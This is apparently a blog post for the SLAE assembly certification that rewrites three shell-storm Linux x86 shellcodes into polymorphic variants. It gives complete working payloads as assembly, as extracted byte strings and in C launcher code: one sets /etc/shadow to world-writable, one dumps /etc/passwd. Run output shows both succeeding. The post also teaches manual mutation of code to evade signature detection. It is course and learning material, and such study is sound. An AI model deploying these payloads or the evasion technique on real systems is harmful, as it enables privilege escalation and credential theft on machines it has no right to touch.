---
layout: single
title: SLAE Assignment 6 -- Polymorphic Shellcode
date: 2019-5-13
classes: wide
header:
  teaser: /assets/images/SLAE/SLAE.jpg
tags:
  - SLAE
  - Linux
  - x86
  - shellcoding
  - MSF
  - polymorphic
--- 
![](/assets/images/SLAE/SLAE.jpg)

## Introduction

Assignment 6 is to create polymorphic versions of three separate shellcodes from [shell-storm](http://shell-storm.org/shellcode/). According to the [Polymorphic code](https://en.wikipedia.org/wiki/Polymorphic_code) Wikipedia entry, polymorphic code is "code that uses a polymorphic engine to mutate while keeping the original algorithm intact. That is, the code changes itself each time it runs, but the function of the code (its semantics) will not change at all. For example, 1+3 and 6-2 both achieve the same result while using different values and operations." We will not be using a polymorphic engine, and will instead be changing the shellcode manually. 

Our goal is to not increase the size of the shellcode by more than 50%.

The format of these posts will be me posting the assembly of the original shellcode, along with its author and a link, and then posting my polymorphic version below with major changes commented. Let's begin!

## Shellcode 1 `chmod(/etc/shadow, 0666) & exit()`

This shellcode was written by ka0x, and is located [here](http://shell-storm.org/shellcode/files/shellcode-556.php). This shellcode will change file permissions on `/etc/shadow` to `rw` for everyone and then call `exit()`.

**Size: 33 Bytes**

```c
#include <stdio.h>
 
/*
    linux/x86 ; chmod(/etc/shadow, 0666) & exit() 33 bytes
    written by ka0x - <ka0x01[alt+64]gmail.com>
    lun sep 21 17:13:25 CEST 2009
 
    greets: an0de, Piker, xarnuz, NullWave07, Pepelux, JosS, sch3m4, Trancek and others!
 
*/
 
int main()
{
 
    char shellcode[] =
            "\x31\xc0"          // xor eax,eax
            "\x50"              // push eax
            "\x68\x61\x64\x6f\x77"      // push dword 0x776f6461
            "\x68\x2f\x2f\x73\x68"      // push dword 0x68732f2f
            "\x68\x2f\x65\x74\x63"      // push dword 0x6374652f
            "\x89\xe3"          // mov ebx,esp
            "\x66\x68\xb6\x01"      // push word 0x1b6
            "\x59"              // pop ecx
            "\xb0\x0f"          // mov al,0xf
            "\xcd\x80"          // int 0x80
            "\xb0\x01"          // mov al,0x1
            "\xcd\x80";         // int 0x80
 
    printf("[*] ShellCode size (bytes): %d\n\n", sizeof(shellcode)-1 );
    (*(void(*)()) shellcode)();
     
    return 0;
}
```

We're going to be working with the assembly comments he provided in his C code. There isn't much room for us to work with here, so we'll most likely be adding junk operations and increasing the size a bit.

```nasm
global _start


section .text

_start:

	xor ecx, ecx		  ; clearing a different register at the start
	mul ecx			  ; this clears both EAX and EDX
	push edx		  ; finally get back around to pushing our null onto the stack but with a 2nd new register
	push dword 0x776f6461     ; this section is the same, but wanted to explain:
	push dword 0x68732f2f     ; we're just pushing '/etc/shadow' onto the stack here 
	push dword 0x6374652f
	mov edi,esp		  ; save stack pointer in different register
	xchg ebx, edi		  ; put stack pointer back into EBX
	push word 0x1ff		  ; push '777' instead of '666' (this is in octal)
	pop ecx
	sub ecx, 0x49		  ; get ECX back down to '666' by subtracting '111'
	mov al,0xf
	int 0x80
	mov al,0x1
	int 0x80
```

Assemble and link our code:
```terminal_session
root@kali:~# nasm -f elf32 chmod.nasm && ld -m elf_i386 chmod.o -o chmod_test
```

Dump the shellcode:
```terminal_session
root@kali:~# objdump -d ./chmod_test|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc9\xf7\xe1\x52\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe7\x87\xdf\x66\x68\xff\x01\x59\x83\xe9\x49\xb0\x0f\xcd\x80\xb0\x01\xcd\x80"
```

Place it into our shellcode.c file:
```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc9\xf7\xe1\x52\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe7\x87\xdf\x66\x68\xff\x01\x59\x83\xe9\x49\xb0\x0f\xcd\x80\xb0\x01\xcd\x80";


main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```

Finally, compile and run!
```terminal_session
root@kali:~# gcc -fno-stack-protector -z execstack -m32 shellcode.c -o chmod_test
```
```terminal_session
root@kali:/etc# cp ~/chmod_test .
root@kali:/etc# ./chmod_test
Shellcode Length:  40
root@kali:/etc# ls -lah | grep shadow
-rw-rw-rw-   1 root    shadow  1.8K Jan 21 00:36 shadow
```

**Size: 40 bytes**

**Increase: 21%**

The shadow file has `666` permissions, our code was a success! 

## Shellcode 2 `Tiny Read File Shellcode - C Language - Linux/x86`

This shellcode was written by Geyslan G. Bem, and is located [here](http://shell-storm.org/shellcode/files/shellcode-842.php). This shellcode will read an arbitrary file, we will be using `/etc/passwd`.

**Size: 51 bytes** 

```c
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \

              "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73"
              "\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f"
              "\x65\x74\x89\xe3\xcd\x80\x93\x91\xb0\x03"
              "\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92"
              "\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd"
              "\x80";


main ()
{

    // When contains null bytes, printf will show a wrong shellcode length.

    printf("Shellcode Length:  %d\n", strlen(shellcode));

    // Pollutes all registers ensuring that the shellcode runs in any circumstance.

    __asm__ ("movl $0xffffffff, %eax\n\t"
            "movl %eax, %ebx\n\t"
            "movl %eax, %ecx\n\t"
            "movl %eax, %edx\n\t"
            "movl %eax, %esi\n\t"
            "movl %eax, %edi\n\t"
            "movl %eax, %ebp\n\t"

            // Calling the shellcode
            "call shellcode");

}
```

Let's use `ndisasm` on this shellcode like we did last assignment to get some assembly out of it. 

```terminal_session
root@kali:~# echo -ne "\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x93\x91\xb0\x03\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd\x80" | ndisasm -u -
```

Output assembly:
```nasm
xor ecx,ecx 
mul ecx 
mov al,0x5 
push ecx 
push dword 0x64777373
push dword 0x61702f63
push dword 0x74652f2f
mov ebx,esp 
int 0x80 
xchg eax,ebx 
xchg eax,ecx 
mov al,0x3 
xor edx,edx 
mov dx,0xfff 
inc edx 
int 0x80 
xchg eax,edx 
xor eax,eax 
mov al,0x4 
mov bl,0x1 
int 0x80 
xchg eax,ebx 
int 0x80 
```

This shellcode already uses a lot of the tricks we've learned over the last few lessons, but we can still change quite a bit of it. Let's see what we can do.

```nasm
global _start


section .text

_start:
	xor ecx,ecx
	xor eax,eax
	xor edx,edx			; longer way to clear these 3 registers 
	mov al,0x5 
	push edx			; can switch this to any of the cleared registers as we're just pushing a null, changed to edx 
	push dword 0x64777373
	push dword 0x61702f63
	push dword 0x74652f2f
	mov ebx,esp 
	int 0x80
	push eax			; Step 1
	push ebx			; Step 2
	push ecx			; Step 3
	pop eax				; Step 4
	pop ecx				; Step 5
	pop ebx 			; Step 6, we just replaced two simple xchg opcodes with 6 lines of push/pops
	mov al,0x3  
	mov dx,0xfff			; deleted previous line which was xor edx,edx since edx is still zeroed 
	inc edx 
	int 0x80
	push eax			; Step 1
	push edx			; Step 2
	pop eax				; Step 3
	pop edx	 			; Step 4, we just replaced a simple xchg opcde with 4 lines of push/pops 
	xor eax,eax 
	mov al,0x4 
	mov bl,0x1 
	int 0x80
	push eax			; Step 1
	push ebx			; Step 2
	pop eax				; Step 3
	pop ebx				; Step 4, we just replaced a simple xchg opcode with 4 lines of push/pops 
```

As you can see from the comments, we had to add some nonsense since the original code was pretty clean. I **did** find a line that wasn't needed that I deleted, so we did improve efficiency in at least one instance. 

Let's assemble and link our code:
```terminal_session
root@kali:~# nasm -f elf32 read.nasm && ld -m elf_i386 read.o -o read
```

Let's dump the shellcode:
```terminal_session
root@kali:~# objdump -d ./read|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc9\x31\xc0\x31\xd2\xb0\x05\x52\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x50\x53\x51\x58\x59\x5b\xb0\x03\x66\xba\xff\x0f\x42\xcd\x80\x50\x52\x58\x5a\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x50\x53\x58\x5b\xcd\x80"
```

Let's paste into our shellcode.c
```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc9\x31\xc0\x31\xd2\xb0\x05\x52\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x50\x53\x51\x58\x59\x5b\xb0\x03\x66\xba\xff\x0f\x42\xcd\x80\x50\x52\x58\x5a\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x50\x53\x58\x5b\xcd\x80";



main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```

Finally, let's compile and run it!
```terminal_session
root@kali:~# gcc -fno-stack-protector -z execstack -m32 shellcode.c -o read
shellcode.c:9:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
 main()
 ^~~~
root@kali:~# ./read
Shellcode Length:  61
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
-----snip-----
```
**Size: 61 bytes**

**Increase: 22%**

We were able to read `/etc/passwd`, it works!

## Shellcode 3 `sys_exit(0)`

This shell code was written by gunslinger_ and is located [here](http://shell-storm.org/shellcode/files/shellcode-623.php). This shellcode simply calls exit, let's see if we can shorten it.

**Size: 8 bytes**

Original assembly:
```nasm
xor eax, eax
mov al, 0x1
xor ebx, ebx
int 0x80
```

Our assembly:
```nasm
global _start


section .text

_start:
	xor eax, eax
	inc eax			; this should save us a byte
	xor ebx, ebx
	int 0x80
```

If we assemble, link it, and dump the shellcode, we can see its only 7 bytes. 
```terminal_session
root@kali:~# nasm -f elf32 exit.nasm && ld -m elf_i386 exit.o -o exit_test
root@kali:~# objdump -d ./exit_test|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x40\x31\xdb\xcd\x80"
```

**Size: 7 bytes**

**Decrease: 12.5%**

## Github

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>

Student ID: SLAE-1458

You can find all of the code used in this blog post [here.](https://github.com/h0mbre/SLAE/tree/master/Assignment6)
